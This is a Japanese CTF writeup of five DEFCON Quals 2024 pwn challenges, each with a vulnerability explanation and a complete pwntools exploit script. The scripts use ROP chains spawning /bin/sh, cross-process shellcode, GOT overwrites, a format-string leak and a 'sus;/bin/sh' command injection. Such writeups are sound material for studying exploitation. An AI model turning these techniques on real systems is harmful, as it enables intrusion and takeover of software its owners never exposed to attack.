# DEFCON Quals 2024 Writeup

知人に誘われて、チーム undef1ned で出場しました。色々あって決勝に出ます。嬉しい。

競技後にやったやつも含めてwriteupを書いておきます。問題文は保存するのを忘れてしまいました。ごめんなさい。

- chatgpt-wasi
- ndles
- readv-me-maybe
- suscall
- saferrrust

## chatgpt-wasi

[問題リンク](https://github.com/Nautilus-Institute/quals-2024/tree/5e15c5e1a2cb100f86c22e759536327e23af5bf8/chatgpt_wasi)

zigで書かれたバイナリが渡されます。ソースコードはなし。

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x1000000)
```

内容を確認してみると、どうやらwasmを解釈して実行するバイナリっぽいです。
真面目にrevを頑張ると、以下のような関数が定義されてることがわかります(競技中のDiscordチャットよりそのまま引用)。

```wasm
(module
  (import "env" "print_number" (func $print_number (param i32 i32)))
  (import "env" "check_variable" (func $check_variable (param i32 i32)))
  (import "wasi_snapshot_preview1" "fd_write" (func $fd_write (param i32 i32 i32 i32) ))
  (import "wasi_snapshot_preview1" "proc_exit" (func $proc_exit (param i32) ))
)
```

`print_number`, `fd_write`, `proc_exit` はWASIで定義されている関数のままで、`check_variable` は渡した数値と `/dev/urandom` から取ってきた値が一致したらフラグを表示する関数です。
ということで、最終目標を `check_variable` のチェックを通すことと設定します。

いろんな関数の脆弱性を頑張って調べてみたのですが、ざっと見た感じ見当たらずしばらく行き詰まってました。

ところで、wasmでメモリを使用する場合は、まずどのようなメモリ空間を用意するのか宣言する必要があります。例えば、

```
(memory 1)
```

とすると、1Page分(65536[bytes])のメモリを確保し、そのメモリを使用可能にするという意味になります。このランタイムでは、必要サイズを mmap の引数に渡し、帰ってきたアドレスをベースにしてメモリアクセスを行うことができます。
また、確保したメモリ領域の`offset=0x100`に`0xdeadbeef`を書き込むには、次のようにすることでできます。

```
  (i32.store offset=0x100 (i32.const 0) (i32.const 0xdeadbeef))
```

実は、この問題の核となる脆弱性は、 mmap が失敗したか否かを見ていないことと、境界チェックを行っていないことです。

```
 If len is zero, mmap() shall fail and no mapping shall be established.
```

とあるように、mmap は `len = 0` で失敗するので、`(memory 0)` で mmap が失敗させると、ベースアドレスが -1 に設定されます。バイナリが no PIE なので、ここから自由に書き換えていけば勝ちです。

まぁ頑張ればシェルとかを取れるのかもしれないですが、この問題ではもっと賢い方法があります。`check_variable` 内部で使われている `/dev/urandom` という文字列が書き込み可能になっていたので、そこを `/dev/null` とかに置き換えることで、`check_variable` で比較される値を 0 に固定することができます。
あとは引数に 0 を渡せばフラグが降ってきます。

exploit.py

```python
from pwn import *
import json
from wasmer import wat2wasm

binary = ELF('./defcon-wasi', checksec=True)

def exploit():
    io = gdb.debug("./defcon-wasi", exe="./defcon-wasi_dbg", gdbscript=script)
    # io = process("./defcon-wasi")

    targets = [0x100c206, 0x100d206]
    flag_path = b"/dev/null\x00"

    def write_code(dest, data: bytes):
        ret = ""

        for i in range(0, len(data), 4):
            v = u32(data[i:i+4].ljust(4, b'\x00'), endian='little')
            ret += f"""
                (i32.store offset={dest + i + 1} (i32.const {v}))
            """

        return ret

    wasm = wat2wasm(
        f"""
            (module
                (import "env" "print_number" (func $print_number (param i32)))
                (import "env" "check_variable" (func $check_variable (param i32 i32 i32)))
                (import "wasi_snapshot_preview1" "fd_write" (func $fd_write (param i32 i32 i32 i32) ))
                (import "wasi_snapshot_preview1" "proc_exit" (func $proc_exit (param i32) ))

                (memory 0)
                (export "memory" (memory 0))

                (func $_start
                    {write_code(targets[0], flag_path)}
                    {write_code(targets[1], flag_path)}

                )
                
                (export "_start" (func $_start))
            )
        """
    )

    log.info(f"wasm: {wasm}")
    log.info(f"len(wasm): {len(wasm)}")

    length = p16(len(wasm) + 2, endian='big')
    io.sendafter(b"Give wasm plz:\n", length)

    io.sendlineafter(b"plz:\n", wasm)

    io.interactive()

context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
context.arch = 'amd64'
context.os = 'linux'
context.bits = 64

script = """
    b check_variable
"""

if __name__ == '__main__':
    exploit()

```


これ僕が解いたわけじゃないのですが、書き込み可能な領域にどんなデータがあるのかしっかり観察する能力が要求されてるな〜みたいに思いました。これがなかったら、バイナリに置いてあるスタックのアドレスから頑張ってROPとかを書き込むことになるのだろうか....

## ndles

LIVE CTF で出された問題です。チームメイトが40分で解いていて、マジで意味がわからなかった。

バイナリと動かすためのDockerfileが渡されます。

```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

バイナリは、いつかに流行っていたWORDLEみたいな感じのゲームです。

このゲームですが、一番最初に自分の回答の長さを入力することができます。11以上で弾かれてしまうのですが、入力用のバッファは9しか用意されていないので、BoFです。
また、8回までチャレンジすることができます。

ある程度真面目のデータ構造をrevすると、

```c
typedef {
    unsigned char len;
    char buf[9];
} buf[8];
```

という構造になっていることがわかります。n回目のチャレンジで `buf[n]` が使われるという感じです。

さて、BoFがあるので、次のチャレンジのlenを大きくすることができ、更に大きなBoFを引き起こすことができますが、スペースなどを入力できないのに加え、途中で入力を止めて次に行くこともできません。したがって、バッファのサイズを不正に大きくすることはできますが、そのバッファはすべてユーザの入力で埋まってしまい、アドレスのリークができません。

該当コード

```c
printf("What is your guess #%d?\n",(ulong)(chall_num + 1));
for (idx = 0; idx < (int)(uint)(byte)ans[chall_num].length; idx = idx + 1) {
    input_char = getchar();
    local_21 = (char)input_char;
    while( true ) {
    ppuVar3 = __ctype_b_loc();
    if (((*ppuVar3)[local_21] & 0x2000) == 0) break;
    input_char = getchar();
    local_21 = (char)input_char;
    }
    ans[chall_num].buf[idx] = local_21;
}
```

と、競技中に思っていたのですが、どうやらfor文のインデックスで使われている変数 `idx` が `buf` の下にあるため、`buf.len = 0xfe` としつつ、`idx` を書き換えるところで `0xff` を書き込んでやれば、そこで入力が停止してその先にあるメモリの内容が読める（libcのアドレス）、ということらしいです（チームメイトの解答を読んでいる限り）。

libcのリークができたら、あとはシェルを呼ぶいい感じのROPコードを書き込んでいきます。`idx` を調整して、ちょうどリターンアドレスがあるところまで飛ばし、mainを終わらせれば勝ちです。
ちなみに、 `system` だと改行文字が入って動かないため `execve` を使いました。

表示の部分がエスケープシーケンスになっており、そこらへんがちょっと面倒だった気がします。それを除けば、割と素直な pwn だったかな。

exploit.py

```python
import sys

#LOCAL = "LOCAL" in sys.argv
LOCAL = True

from ptrlib import nasm
from pwn import *

context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
context.arch = 'amd64'
context.os = 'linux'
context.bits = 64

# BIN_NAME = './challenge'
BIN_NAME = './challenge_patched'
REMOTE_ADDR = os.environ.get('HOST', 'localhost')
REMOTE_PORT = 31337
REMOTE_LIBC_PATH = 'libc.so.6'

libc = ELF("./libc.so.6")

scripts = """
  seploader challenge
  # b 298
  b 329
"""

if LOCAL: stream = process(BIN_NAME)
# if LOCAL: stream = gdb.debug(BIN_NAME, gdbscript=scripts)
else: stream = remote(REMOTE_ADDR, REMOTE_PORT)

idx_offset_from_1 = 0x6c

stream.sendlineafter(b"?", b"10")
stream.sendlineafter(b"?", b"7")

stream.sendlineafter(b"?", b"A"*9 + bytes([0xfe]))
stream.sendlineafter(b"?\n", b"P" * 9 + b'\xfe' + b'p' * (idx_offset_from_1 - 10) + b"\xff") # skip input

def got_char(stream):
    stream.readuntil(b" ")
    word = stream.read(1)
    stream.read(1) # skip space

    return word

def got_string(stream, num):
    return b"".join([got_char(stream) for _ in range(num)])

got = got_string(stream, 10)
got = got_string(stream, 0xfe)


print(f"{got=}")

ret_offset_from_1 = 0x8c

start_main_ret = unpack(got[ret_offset_from_1: ][: 8])
stack = unpack(got[0xac: ][: 8])

libc_base = start_main_ret - 0x29d90
libc.address = libc_base

print(f"{got=}")
print(f"stack = {hex(stack)}")
print(f"libc_base = {hex(libc_base)}")

rop = ROP(libc)

rop.execve(next(libc.search(b"/bin/sh\x00")), 0, 0)

chain = rop.chain() + b'\x00' * 4

idx_offset_from_2 = idx_offset_from_1 - 10
ret_offset_from_2 = ret_offset_from_1 - 10
payload = b'P' * 9 + b'\xfe' + b'p' * (idx_offset_from_2 - 10) + p8(ret_offset_from_2 - 1) + chain
payload += b'p' * (0xff - (ret_offset_from_2 + len(chain)) - 1)

stream.sendlineafter(b"?\n", payload)

idx_offset_from_3 = idx_offset_from_2 - 10

payload = b'R' * 9 + b'\x01'
payload += b'r' * ( ((7 - 3 + 1) * 10 - 1) - len(payload) )

payload += b'\x01' + b'r'
payload += (idx_offset_from_3 - len(payload)) * b'R'
payload += p8(0xff)

info(f"{len(payload)=}")

stream.sendlineafter(b"?\n", payload)

stream.sendlineafter(b"?", b"r")

success("got real world")
stream.interactive()
```

40分...????

## readv-me-maybe

LIVE CTF で出された問題です。

バイナリと動かすためのDockerfileが渡されます。

```
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    FORTIFY:  Enabled
```

バイナリの内容は以下のようなものでした。

- fork する
    - 子プロセス
        - 自身のバイナリがおいてある領域をmprotectしてすべてrwxに
        - SECCOMPする(後述)
    - 親プロセス
        - 子プロセスのメモリ領域を自由に読み書きできる(process_vm_readv, process_vm_writev)
        - 終了時、子プロセスにexitを送る

SECCOMPの内容は次の通りです。

```
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x09 0xc000003e  if (A != ARCH_X86_64) goto 0011
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x06 0xffffffff  if (A != 0xffffffff) goto 0011
 0005: 0x15 0x04 0x00 0x0000006e  if (A == getppid) goto 0010
 0006: 0x15 0x03 0x00 0x000000e6  if (A == clock_nanosleep) goto 0010
 0007: 0x15 0x02 0x00 0x000000e7  if (A == exit_group) goto 0010
 0008: 0x15 0x01 0x00 0x00000136  if (A == process_vm_readv) goto 0010
 0009: 0x15 0x00 0x01 0x00000137  if (A != process_vm_writev) goto 0011
 0010: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0011: 0x06 0x00 0x00 0x00000000  return KILL
```

親はプロンプトを受け付けて読み書きを行うことができます。

```c
void parent(__pid_t param_1)

{
  long lVar1;
  undefined8 uVar2;
  undefined8 uVar3;
  
  puts("process_vm_readv-me-maybe");
  puts("In the increasingly less obvious-what-the-pun-was series");
  while( true ) {
    while( true ) {
      puts("Menu:");
      puts("1. process_vm_readv");
      puts("2. process_vm_writev");
      puts("3. exit");
      lVar1 = read_int("Choice: ");
      if (lVar1 != 2) break;
      uVar2 = read_int("Value: ");
      uVar3 = read_int("Address: ");
      writev_helper(param_1,uVar3,uVar2);
    }
    if (lVar1 == 3) break;
    if (lVar1 == 1) {
      uVar2 = read_int("Address: ");
      uVar2 = readv_helper(param_1,uVar2);
      __printf_chk(1,"Value: %lx\n",uVar2);
    }
  }
  kill(param_1,9);
  return;
}

undefined8 readv_helper(undefined8 param_1,void *param_2)

{
  long lVar1;
  long in_FS_OFFSET;
  undefined8 local_38;
  iovec local_30;
  iovec local_20;
  
  local_30.iov_base = &local_38;
  lVar1 = *(long *)(in_FS_OFFSET + 0x28);
  local_30.iov_len = 8;
  local_20.iov_len = 8;
  local_20.iov_base = param_2;
  process_vm_readv(param_1,&local_30,1,&local_20,1,0);
  if (lVar1 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return local_38;
}

void writev_helper(undefined8 pid,void *addr,undefined8 val)

{
  long lVar1;
  long in_FS_OFFSET;
  undefined8 local_40 [2];
  iovec local_30;
  iovec local_20;
  
  lVar1 = *(long *)(in_FS_OFFSET + 0x28);
  local_30.iov_base = local_40;
  local_30.iov_len = 8;
  local_20.iov_len = 8;
  local_40[0] = val;
  local_20.iov_base = addr;
  process_vm_writev(pid,&local_30,1,&local_20,1,0);
  if (lVar1 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

`process_vm_readv`, `process_vm_writev` という見慣れないシステムコールを使っています。

man 2 process_vm_readv

```
ssize_t process_vm_readv(pid_t pid,
                        const struct iovec *local_iov,
                        unsigned long liovcnt,
                        const struct iovec *remote_iov,
                        unsigned long riovcnt,
                        unsigned long flags);

DESCRIPTION
       These  system  calls transfer data between the address space of the calling process ("the local process") and the process identified by pid ("the remote process").  The data moves directly between the address spaces
       of the two processes, without passing through kernel space.

       The process_vm_readv() system call transfers data from the remote process to the local process.  The data to be transferred is identified by remote_iov and riovcnt: remote_iov is a pointer to an array describing ad‐
       dress ranges in the process pid, and riovcnt specifies the number of elements in remote_iov.  The data is transferred to the locations specified by local_iov and liovcnt: local_iov is a pointer to an array  describ‐
       ing address ranges in the calling process, and liovcnt specifies the number of elements in local_iov.
```

PIDで指定したプロセスのメモリを書き換えるシステムコールで、これを使って自由に子プロセスを弄ることができる、という状況です。
ただし、子プロセスにはASLRがあるので何かしらの方法でアドレスをリークしないと使えません。

よくよく `readv_helper` を見てみると、エラーハンドリングされていないことがわかります。実際、子プロセスのアドレスとして無効な値を読み込もうとすると、未初期化な `local38` が帰ってきます。問題ではここにスタックのアドレスが入っているので、ここをから頑張ってバイナリのベースアドレスを読んでいきます。

さて、これで子プロセスに対して任意のコードを実行することができるようになりました。ただ子プロセスにはSECCOMPが掛かっており、単純にシェルコードを実行することができないため、getppidなどを使い、今度は逆に親のメモリ空間を書き換えていく必要があります。
親はrwxじゃないので、いい感じのROPをいい感じに書き込むシェルコードを書き込むと、いい感じにシェルが取れます。

exploit.py

```python
from time import sleep
from pwn import *

context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
context.arch = 'amd64'
context.os = 'linux'
context.bits = 64

# BIN_NAME = './challenge_patched'
BIN_NAME = './challenge'
REMOTE_ADDR = os.environ.get('HOST', 'localhost')
REMOTE_PORT = 31337
REMOTE_LIBC_PATH = 'libc.so.6'
# LOCAL = "LOCAL" in sys.argv
LOCAL = False

script = """
    seploader challenge
"""

chall = ELF(BIN_NAME)

# if LOCAL: stream = process(BIN_NAME)
if LOCAL: stream = gdb.debug("./challenge_patched", gdbscript=script)
else: stream = remote(REMOTE_ADDR, REMOTE_PORT)

def readv(addr):
    stream.sendlineafter(b'Choice:', b'1')
    stream.sendlineafter(b'Address:', hex(addr)[2:])
    stream.recvuntil(b"Value: ")
    return int(stream.recvline(keepends=False), 16)

def writev(addr, val):
    stream.sendlineafter(b'Choice:', b'2')
    stream.sendlineafter(b'Value:', hex(val)[2:].encode())
    stream.sendlineafter(b'Address:', hex(addr)[2:].encode())

    info(f"writev: {hex(addr)} <- {hex(val)}")

libc = ELF("./libc.so.6")

stream.readuntil(b"Menu")
sleep(3)

addr_stack = readv(0)
info(f"addr_stack: {hex(addr_stack)}")

libc_base = readv(addr_stack - 0x70) - (libc.symbols['__libc_start_main'] + 128)
success(f"libc_base: {hex(libc_base)}")
libc.address = libc_base

bin_base = readv(addr_stack - 0x60) - chall.symbols['__do_global_dtors_aux_fini_array_entry']
success(f"bin_base: {hex(bin_base)}")
chall.address = bin_base

child_shellcode_dest = bin_base + 0x3000

pop_rdi = 0x000000000002a3e5 + libc_base
bin_sh = next(libc.search(b'/bin/sh\0'))
system = libc.symbols['system']
ret = 0x000000000000101a + bin_base

rop_chain = [ret] * 5 + [pop_rdi, bin_sh, system]

rop_dest = addr_stack - 0x70 - 0xa0 # だいたいこの辺

child_shellcode = f"""
    mov rax, 110 # sys_getppid
    syscall

    mov ebp, eax # ppid
"""

for r in rop_chain:
    child_shellcode += f"""
    mov edi, ebp
    mov rsi, {rop_dest}
    mov rdx, {r}
    mov rax, {chall.symbols['writev_helper']}
    call rax
"""
    rop_dest += 8

child_shellcode += f"""
    mov edi, ebp
    mov rsi, {chall.got['kill']}
    mov rdx, {ret}
    mov rax, {chall.symbols['writev_helper']}
    call rax
"""

child_shellcode += f"""
    mov rdi, 0
    mov rax, 231 # exit_group

    syscall
"""

child_shellcode = asm(child_shellcode)

for i in range(0, len(child_shellcode), 8):
    writev(child_shellcode_dest + i, u64(child_shellcode[i:i+8].ljust(8, b'\0')))

# writev(chall.got['usleep'], bin_base + 0x000000000000101a)
writev(chall.got['usleep'], child_shellcode_dest)

sleep(3)
success("got real world")
stream.sendlineafter(b'Choice:', b'3')

stream.interactive()
```

子プロセスのSECCOMPを潰さないとデバッグが辛いので、LD_PRELOADとかで潰しておきましょう。


## suscall

[問題リンク](https://github.com/Nautilus-Institute/quals-2024/tree/5e15c5e1a2cb100f86c22e759536327e23af5bf8/suscall)

sus? という名前のバイナリが渡されます。

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

バイナリを真面目に解析すると、独自のFILE構造体でファイルを管理していて、更にオレオレヒープに脆弱性があります。オレオレヒープはヒープのtopアドレスを保持してずらすだけの単純なものです。
用意されているメモリは.bss領域に取られており、拡張などはできません。
関数としては、`galloc` と `realloc` があります。

`galloc` で返される領域は0に初期化されてます。

また、reallocしたとき用意されたヒープに残りのメモリが余っているかのチェックが行われていないため、バッファオーバーフローして隣接しているメモリ領域へ書き込みを行うことができます。

```c
undefined * realloc_unchecked(undefined *param_1,size_t cnt,size_t len)

{
  undefined *__dest;
  
  if (param_1 + cnt == top) {
    // 本当は境界チェックが必要
    top = param_1 + len;
    __dest = param_1;
  }
  else {
    __dest = galloc(len);
    memcpy(__dest,param_1,cnt);
  }
  return __dest;
}
```

また、メモリは次のように配置されています。

```
- GOTとか
- グローバル変数
- ヒープスタート
...
- ヒープエンド
- ヒープのtopアドレス
```

よって、BoFによってヒープのtopアドレスを書き換えることができます。ただし、gallocはヒープエンドより前の領域しか扱うことができないので、これで改ざんできるのはGOTやグローバル変数のみです。

GOTテーブルは次のようになっています。

```
GOT protection: Partial RELRO | Found 13 GOT entries passing the filter
[0x404018] abort@GLIBC_2.2.5 -> 0x401030 ◂— endbr64
[0x404020] unlink@GLIBC_2.2.5 -> 0x401040 ◂— endbr64
[0x404028] strncpy@GLIBC_2.2.5 -> 0x7ffff7f01900 (__strncpy_avx2) ◂— endbr64
[0x404030] puts@GLIBC_2.2.5 -> 0x7ffff7e157d0 (puts) ◂— endbr64
[0x404038] strlen@GLIBC_2.2.5 -> 0x7ffff7f001c0 (__strlen_avx2) ◂— endbr64
[0x404040] printf@GLIBC_2.2.5 -> 0x401080 ◂— endbr64
[0x404048] __assert_fail@GLIBC_2.2.5 -> 0x401090 ◂— endbr64
[0x404050] memset@GLIBC_2.2.5 -> 0x7ffff7efde80 (__memset_avx2_unaligned_erms) ◂— endbr64
[0x404058] alarm@GLIBC_2.2.5 -> 0x7ffff7e763c0 (alarm) ◂— endbr64
[0x404060] syscall@GLIBC_2.2.5 -> 0x7ffff7ea9e80 (syscall) ◂— endbr64
[0x404068] memcpy@GLIBC_2.14 -> 0x4010d0 ◂— endbr64
[0x404070] setvbuf@GLIBC_2.2.5 -> 0x7ffff7e15f80 (setvbuf) ◂— endbr64
[0x404078] exit@GLIBC_2.2.5 -> 0x4010f0 ◂— endbr64
```

ファイルの読み込みを行う関数の中に、入力を読み込んでそれをそのまま `unlink` へ渡すコードがあるので、最終的なゴールとして `unlink` を `system` にすることを考えます。

しかし、ただtopをunlinkへ向けると、`galloc` がメモリを0初期化してしまう問題に当たります。

```c
undefined * galloc(size_t length)

{
  undefined *__s;
  undefined *block_end;
  
  __s = global_buffer;
  block_end = global_buffer + length;
  if ((undefined *)0x40649f < block_end) {
                    /* WARNING: Subroutine does not return */
    __assert_fail("block_end < heap_end","main.c",0x44,"galloc");
  }
  if ((undefined *)0x40649f < block_end) {
                    /* WARNING: Subroutine does not return */
    abort();
  }
  global_buffer = block_end;
  memset(__s,0,length);
  return __s;
}
```

そこで、まず最初に `memset` のGOTへtopを向けて、それを `ret` とかで潰します。

このまま進めると、次の入力バッファの確保で `memset` から 16バイト離れた `syscall` が返されるのですが、プログラム中に文字列をNULL終端で初期化するコードがあり、`syscall` の最下位バイトが0になってしまいます。これはSEGVに繋がります。
これを解決するため、topに設定する値を `memset - 1` にしました。これによって、これ以降確保されるメモリ領域が1バイトずつずれ、0で上書きされてしまうバイトを最上位バイトにすることができます。
(追記: ついでに `exit` も潰しておきます)

さて、これで好きな場所のメモリを取ってこれるようになったので、もう一週してtopを書き換え、今度は `unlink` を改ざんしていきます。libcのベースアドレスリークができていないので、`unlink` を `printf@plt` にして FSB でアドレスリークを行います。これはよく使われるテクニックなのでパパっと使えるようになりたい。

オフセット調整を頑張るとlibcがリークでき、更にもう一週して `unlink` を `system` に向けたら勝ちです。

exploit.py

```python
from pwn import *

binary = ELF('./sus?', checksec=True)

def exploit():
    stream = gdb.debug("./sus?", exe="./sus?_dbg", gdbscript = """
        # watch global_buffer if global_buffer < 0x4040a0
        handle SIGALRM ignore
        # b 436
    """)

    buf_end = 0x40649f

    stream.send(b"\x00" * 570) # fill the buffer

    ret = 0x000000000040101a
    stream.sendline(b"A" * 32 + pack(binary.got['memset'] - 1)[:3])
    stream.sendline(b'P' + pack(ret)[:3])
    # memset -> ret

    def get_fill_from(addr: int):
        return (buf_end - 1 - addr) // 0x10

    stream.send(b"\x00" * (get_fill_from(binary.got['memset']) - 5))
    # now global_buffer = 0x40644f

    payload = b'X' * (buf_end + 1 - 0x40644f) + pack(binary.got['unlink'] - 1)[:3]
    stream.sendline(payload)

    printf_plt = 0x401080
    stream.sendline(b'Q' + pack(printf_plt)[:3])

    stream.send(b'\x00' * (get_fill_from(binary.got['unlink']) - 5))

    payload = b'X' * (buf_end + 1 - 0x40644f) + pack(binary.got['exit'] - 1)[:3]
    stream.sendline(payload)

    stream.sendline(b'R' + pack(ret)[:3])
    # exit -> ret

    stream.sendline(b'\x00' * 10)

    def exec_fmt(payload):
        stream.sendline(b"sus")
        stream.sendline(b"sus" + payload)

        stream.readuntil(b'SUS ALERT!!!')
        stream.readuntil(b'!!!\n')
        stream.readuntil(b'sus')

        ret = stream.readuntil(b'Not')[0: -3]
        return ret

    libc_start_main_ret = int(exec_fmt("%19$lx".encode()).decode(), 16)
    libc = ELF("/usr/lib/libc.so.6")

    # info(f"libc_start_main_ret = {hex(libc_start_main_ret)}")
    libc_base = libc_start_main_ret - 0x25c88
    success(f"libc address: {hex(libc_base)}")

    libc.address = libc_base
    info(f"system = {hex(libc.symbols['system'])}")

    stream.send(b"\x00" * 555)

    stream.sendline(b'x' * (0x49 + 0x10) + pack(binary.got['unlink'] - 1)[:3])
    stream.send(b'P' + pack(libc.symbols['system'] + 1)[:8]) # +1 is stack alignment

    stream.send(b"\x00" * 100)

    stream.sendline(b'sus')
    stream.sendline(b'sus;/bin/sh')

    success("got real world")

    stream.sendline(b'whoami')

    stream.interactive()

if __name__ == '__main__':
    exploit()
```

## saferrrust

[問題リンク](https://github.com/Nautilus-Institute/quals-2024/tree/main/saferrrust)

Rustで書かれたバイナリが渡されます。

```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

セーブ機能付きの数当てゲームです。最初にプレイヤーネームを聞かれます。
実際のゲームは単純で、数があたったら+100点、外れたら-1点され、合計得点が一定数を超えると勝利になります。

Panicが発生したときは、プログラムの終了ではなく `error.log` というファイルにその内容が書き出されます。
また、どのセーブファイルに保存するかはユーザが選択でき、1から3の数を入力することでそれぞれ `savefile1`, `savefile2`, `savefile3` にSaveとLoadを行うことができます。このとき、`savefile` は`mmap`を使ってメモリ上にマップされますが、これはバイナリが配置されている領域の次の領域に配置されます。

このセーブファイル選択に脆弱性があり、0と入力するすると `error.log` をセーブファイルとして認識し、そしてそれをバイナリの領域にマップしてしまいます。

`error.log` がマップされる領域には `"savefile"` というファイル名自体も保存されているため、これを `/flag` とすることでフラグファイルをセーブファイルとして読み込むことができます。savefile の先頭にはプレイヤーネームが書き込まれ、それが毎回表示されるので、フラグをセーブファイルとして読み込むと、このときにフラグが表示されます。
ただ、普通にプレイするだけではそんな沢山のエラーを起こせないし、起こしたとしても異常終了してしまいます。

では実際にどうやって `error.log` に、`"savefile"` を書き換えるだけの大量のエラーを起こさせるかですが、数当てゲームの得点計算にも脆弱性があります。
おそらく、得点はi8で管理されており、オーバーフローが発生する場合を条件分岐して弾いているのですが、点数がちょうど28点のとき、128になってエラーが発生します。このエラーはプログラムを終了しないようにされているので、何度も同じエラーを発生させることができます。この時の `error.log` は次のようになります。

```
thread 'main' panicked at src/main.rs:139:21:
attempt to add with overflow
note: run with `RUST_BACKTRACE=1` environment variable to display a backtrace
==========
CURRENT STATE
Your name: "player_name"
Your total score: 28
thread 'main' panicked at src/main.rs:139:21:
attempt to add with overflow
==========
CURRENT STATE
Your name: "player_name"
Your total score: 28
thread 'main' panicked at src/main.rs:139:21:
attempt to add with overflow
==========
CURRENT STATE
Your name: "player_name"
Your total score: 28
thread 'main' panicked at library/std/src/io/stdio.rs:1021:9:
failed printing to stdout: Input/output error (os error 5)
```

いい感じにユーザの入力が載っているので、あとはオフセットを調整して行けばフラグを得ることができます。

exploit.py

```python
from pwn import *
import re

binary = ELF('./saferrrust', checksec=True)

def extract_two_integers(text):
    numbers = re.findall(r'\d+', text)
    return int(numbers[0]), int(numbers[1])

def fail(io) -> int:
    io.sendline(b"1")
    io.readuntil(b"score is ")

    current = int(io.readline().strip()[: -1])

    io.readuntil(b"between ")
    r = io.readuntil(b"(").decode()
    a, b = extract_two_integers(r)
    
    io.sendlineafter(b'!\n', str(b).encode())

    return current - 1

def correct(io) -> int:
    io.sendline(b"1")
    io.readuntil(b"score is ")

    current = int(io.readline().strip()[: -1])

    io.readuntil(b"between ")
    r = io.readuntil(b"(").decode()
    a, b = extract_two_integers(r)
    
    io.sendlineafter(b'!\n', str(a + 1).encode())

    result = io.readline()
    if b'Correct' in result:
        return current + 100
    elif b'Wrong' in result:
        return current - 1
    else:
        error("Unknown result: " + result.decode())

def save(io, n: int):
    io.sendline(b"2")
    io.sendline(str(n).encode())

def load(io, n: int):
    io.sendline(b"3")
    io.sendline(str(n).encode())

def exploit():
    io = gdb.debug("./saferrrust")
    # io = gdb.debug("./saferrrust", exe="./saferrrust", gdbscript="""
    #     # catch syscall open
    #     # catch syscall openat
    # """)


    io.sendlineafter(b"name:", (b'pppppp' + b'/////flag' * 3 + (b'abcdefghijklmnopqrstuvwxABCDEFGHIJKLMNOPQRSTUVWX') * 10)[: 0x200])

    overflowed = 0
    while overflowed < 3:
        while correct(io) < 0:
            pass

        while 28 < fail(io):
            pass

        s = correct(io)
        if s == 128:
            overflowed += 1

        for i in range(30):
            fail(io) # score <= 27

    io.interactive()
if __name__ == '__main__':
    exploit()
```

# 所感

発想というより、どれだけ基礎的なexploitを書けますか、みたいな問題が多かった印象ですね。LIVE CTFみたいに開発スピードが要求されるところだとこういうのが顕著に現れる...
やっぱり、細かいテクニックみたいなのはしっかりと固めておきたいなぁ。どこでも使えるし。

CTFをサボりすぎていて予選ではほぼ貢献できなかったから、せっかく本戦に連れて行ってもらえるなら少しでも役に立ちたい！
このwriteupもそういった意図で執筆しています。

すごい楽しいCTFだったし、本戦でアメリカ行ったらこのノリで体験記も書きます。お楽しみに！
